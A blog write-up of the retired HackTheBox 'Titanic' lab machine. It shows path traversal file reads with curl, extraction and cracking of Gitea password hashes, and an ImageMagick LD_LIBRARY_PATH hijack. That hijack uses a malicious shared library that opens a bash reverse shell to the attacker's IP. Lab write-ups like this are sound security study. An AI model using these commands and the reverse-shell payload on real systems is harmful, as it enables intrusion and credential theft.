---
layout: post
title: "Titanic"
date: 2025-06-21
categories: [htb, easy]
provider: htb
machine: titanic
retired: true
---

I think this was the fastest user flag I've got so far, but root took me a while. I also wonder if I got the foothold in the intended way. Most importantly, one of the lessons learned with another (still active) box was to do my CVE research more breadth-first instead of going deep on the first option... and I probably over-compensated for this one. Let's go through it:

<div class="attack-chain">
  {% include attack-step.html title="Test web app" description="Identified arbitrary file read vulnerability via path traversal" type="enum" %}
  {% include attack-step.html title="Enumerate web server" description="Discovered `dev` subdomain by virtual host bruteforce, hosting Gitea instance" type="enum" %}
  {% include attack-step.html title="Exploit file read vulnerability" description="Extracted Gitea configuration and database files" type="attack" %}
  {% include attack-step.html title="Foothold" description="Cracked `developer`'s password from Gitea DB and gained SSH access" type="foothold" %}
  {% include attack-step.html title="Enumerate filesystem" description="Found script run frequently by `root`, invoking ImageMagick" type="enum" %}
  {% include attack-step.html title="Privilege escalation" description="Exploited ImageMagick CVE-2024-41817, hijacking LD_LIBRARY_PATH, to gain reverse shell as `root`" type="root" %}
</div>

## Glitch string quartet music on
These Linux boxes usually start the same way, a quick `nmap` scan showing SSH & HTTP only, and the full TCP scan confirming it later on:
```
$ sudo nmap -p- -sV 10.10.11.55 -vv -oA full-tcp
<SNIP>
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Logistics (`/etc/hosts`) taken care of, we go have a look at the web app, which lets you book a ticket on the Titanic. I wouldn't, if I were you. But it looks like we have to, so we do, and it immediately triggers the download of a JSON file containing whatever details we provided, for example, `http://titanic.htb/download?ticket=53b1bb14-044c-4b9b-9d19-f7e17b97ad92.json`.

There's nothing interesting about the file itself and it doesn't look like it can be abused much. But every time we have an endpoint that lets us download a file by name we are compelled to just try something and see what happens... and sure enough it is vulnerable to arbitrary file read via path traversal:
```
$ curl http://titanic.htb/download?ticket=../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
<SNIP>
developer:x:1000:1000:developer:/home/developer:/bin/bash
<SNIP>
```

\[Hacker voice\] _we're kinda in_, so this gives me my fastest user flag to date. Trying things out to see what else we can get (sadly there's no private SSH key, for example), and seeing in the response headers that we're dealing with [Werkzeug](https://github.com/pallets/werkzeug) as a web app framework, we can hope there is a `titanic.py` or `app.py` file. The latter does hit, but it doesn't tell us anything about the application that we don't already know.

Not finding much, we go back to our basic checklist, and run directory and vhost enumeration. This is how we find out about `dev.titanic.htb`:
```
$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://titanic.htb/ -H 'Host: FUZZ.titanic.htb' -fs 306-330

<SNIP>
dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 35ms]
<SNIP>
```

This is a [Gitea](https://about.gitea.com/) site, a source code repository system similar to Github. We can register an account, and that might have opened other cans of worms that I didn't explore. Maybe that was the intended route... But without even needing to register, we can browse the source code for the app and some docker-compose files.

One of these is for a MySQL database container and includes some credentials. I spent a bit of time (more than I wanted to due to some kind of `fail2ban`...) trying these, and some modifications of these, on SSH. No luck.

## Google-fu
Assuming these credentials were meant for later, I switched attention to the compose file for Gitea itself. The interesting thing was the volume path, `/home/developer/gitea/data/`, which I could confirm was live with the original file read vulnerability on the site, since providing existing folders to the download endpoint caused an internal server error. I spent quite a bit of time here, either on Gitea's documentation or on other random Google results, trying to figure out the names of configuration files, but more importantly the right path for any files inside that volume. I finally came across [this post by an equally confused user](https://forum.gitea.com/t/where-is-the-custom-folder-inside-a-docker-installation/564). So the path goes `gitea/`, `data/`, ... and then `gitea/` again, for whatever reason. From there I could finally find what I was looking for, like the app's configuration file, which pointed us to something valuable:
```
$ curl http://titanic.htb/download?ticket=../../../../../home/developer/gitea/data/gitea/conf/app.ini
APP_NAME = Gitea: Git with a cup of tea

<SNIP>

[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
<SNIP>
```

Using the same technique to get the file, we go straight for the credentials.
```
$ sqlite3 gitea.db       
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
<SNIP>
user
<SNIP>

sqlite> .header on
sqlite> select * from user;
<WHOA SNIP>
sqlite> select name, passwd, passwd_hash_algo, salt from user;
name|passwd|passwd_hash_algo|salt
administrator|c<REDACTED>6|pbkdf2$50000$50|2<REDACTED>b
developer|e<REDACTED>6|pbkdf2$50000$50|8<REDACTED>4
```

Hashcat's example hashes for `PBKDF2` don't provide a clear match, so I'm back googling for how to properly feed these to the fluffy hash muncher. HTB is slowly eating the world, so [one of 0xdf's write-ups](https://0xdf.gitlab.io/2024/12/14/htb-compiled.html) for an old machine came up. It sounded awfully similar to this machine going by the description, though, and I've had enough close encounters with spoilers, so I kept looking. Someone wrote a pull-request for Hashcat to [add a gitea2hashcat.py](https://github.com/hashcat/hashcat/pull/4154) (in February, so maybe while working on this box, hah!), and despite not yet being accepted at the time of writing, the code does what it says on the tin. I made a small modification to clean up the output, ran the script to extract the hashes and let Hashcat munch on them. `developer`'s password comes up quickly (`administrator`'s doesn't, as expected, so we kill the process):
```
$ sqlite3 gitea.db 'select salt,passwd from user;' | ./gitea2hashcat.py > hashes.txt

$ hashcat hashes.txt ~/aen/rockyou.txt
<SNIP>
sha256:50000:i<REDACTED>=:5<REDACTED>=:<REDACTED>
```

We _finally_ have a foothold. Euh, I mean, \[hacker voice\] _we're in_. The flag was already in the pocket, so it's' time to look for a way to escalate privileges.

## Tragic hijack
Going through the privilege escalation checklist, we find that `/opt` has interesting things going on. There's a folder with the same ticket-booking application we know well at this point, and a `scripts` folder with a single such thing inside:
```
$ cat /opt/scripts/identify_images.sh
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

This `metadata.log` in `/opt/app/static/assets/images` is owned and only writeable by `root`, and we soon realise that it's being re-written every minute, indicating that, well, the script above is being run every minute by `root`. Subverting it in some way will give us what we want.

There are a few binaries in that script that are being called without their full path, so I spent some time trying to figure out if this was exploitable by checking for common `PATH` directories where we could write. Eventually convinced that this was not the way, I started looking for CVEs in ImageMagick.

[The very first one I found](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8), because I looked up the exact version of the binary (7.1.1-35) as one should always do, looked promising. If I had _just tried it_, it would have just worked. But since I had gotten myself in rabbit holes recently for going too deeply into the first thing I'd found, I just noted it down and moved on. In a less specific search, I found out about [ImageTragick](https://imagetragick.com/), a suite of old vulnerabilities, and I think I decided this must be it because the name was great. Yes, instead of going deeply into the first thing, I went deeply into the second thing.

After a good while trying to understand why the tragic JPG files I was creating were apparently not even being processed, I remembered the original promising CVE and finally gave that a try. It exploits an empty `LD_LIBRARY_PATH`  environment variable, so if we place a malicious library file in the `scripts` directory, it will be loaded when `/usr/bin/magick` is executed. We'll make it maliciously connect back to us:
```
$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("bash -c 'bash -i >& /dev/tcp/10.10.14.114/8888 0>&1'");
    exit(0);
}
EOF
```

 Once the minute passes and `identify_images.sh` runs, we get our root shell:
```
$ nc -nlvp 8888
listening on [any] 8888 ...
connect to [10.10.14.114] from (UNKNOWN) [10.10.11.55] 33236
bash: cannot set terminal process group (45494): Inappropriate ioctl for device
bash: no job control in this shell
root@titanic:/opt/app/static/assets/images# whoami
whoami
root
```

## Roll the credits
- Sometimes you find the information you need in the weirdest places. I'm not sure LLMs can figure that out, so I'm glad I'm an old Googler.
- Machines are getting retired in an awkward order, but this was not the first time I fumbled my CVE research. I can do better.
- As always, for reading this far, you're a champ.